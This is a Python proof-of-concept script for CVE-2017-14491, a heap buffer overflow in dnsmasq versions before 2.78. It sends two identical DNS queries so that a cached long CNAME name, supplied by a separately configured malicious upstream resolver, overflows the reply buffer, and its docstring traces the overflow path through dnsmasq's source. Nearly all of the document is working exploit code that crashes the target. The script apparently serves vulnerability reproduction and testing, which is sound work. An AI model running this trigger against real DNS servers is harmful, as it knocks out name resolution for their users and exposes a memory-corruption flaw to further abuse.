#!/usr/bin/env python3
"""
PoC for CVE-2017-14491 (dnsmasq < 2.78 heap-based buffer overflow).

Sends a benign A query for victim.example TWICE:
  1. dnsmasq forwards it to the malicious upstream (server=127.0.0.1#5399),
     receives a CNAME -> A pair with a long target name, and caches it.
  2. dnsmasq answers the second query FROM CACHE, rebuilding the reply via
     add_resource_record(..., "d", long_name). The pre-fix do_rfc1035_name()
     writes the full name and only checks `limit` afterwards, walking past the
     reply limit into the (ASan-fenced) answer-buffer slack ->
     AddressSanitizer use-after-poison abort in do_rfc1035_name (util.c:244),
     reached from add_resource_record (rfc1035.c:1140) / answer_request.

Usage: poc_cve_2017_14491.py [host] [port]
"""

import os
import socket
import struct
import sys
import time

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 53


def query_once():
    txid = os.urandom(2)
    header = txid + struct.pack(">HHHHH", 0x0100, 1, 0, 0, 0)  # RD=1
    question = b"\x06victim\x07example\x00" + b"\x00\x01\x00\x01"  # A IN
    pkt = header + question
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    s.sendto(pkt, (host, port))
    try:
        data, _ = s.recvfrom(4096)
        n = len(data)
    except socket.timeout:
        n = None
    finally:
        s.close()
    return n


print(f"[poc] query 1 -> {host}:{port} (forward + cache the long-name CNAME/A)")
n1 = query_once()
print(f"[poc]   reply: {n1} bytes" if n1 else "[poc]   no reply")
time.sleep(0.5)
print("[poc] query 2 (served from cache -> overflow in do_rfc1035_name)")
n2 = query_once()
print(f"[poc]   reply: {n2} bytes" if n2 else "[poc]   no reply (dnsmasq aborted on the overflow)")
